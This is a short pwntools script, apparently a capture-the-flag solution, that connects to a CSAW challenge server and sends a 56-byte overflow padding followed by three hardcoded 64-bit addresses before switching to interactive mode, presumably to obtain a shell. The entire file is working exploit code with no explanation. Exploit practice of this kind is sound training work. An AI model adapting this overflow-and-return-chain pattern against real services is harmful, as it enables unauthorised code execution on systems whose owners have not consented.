from pwn import *

r = remote('pwn.chal.csaw.io', 10107)
r.recvrepeat(1)
r.sendline('A'*56 + p64(0x00000000004005d5) + p64(0x400698) + p64(0x00000000004005b6))
r.interactive()
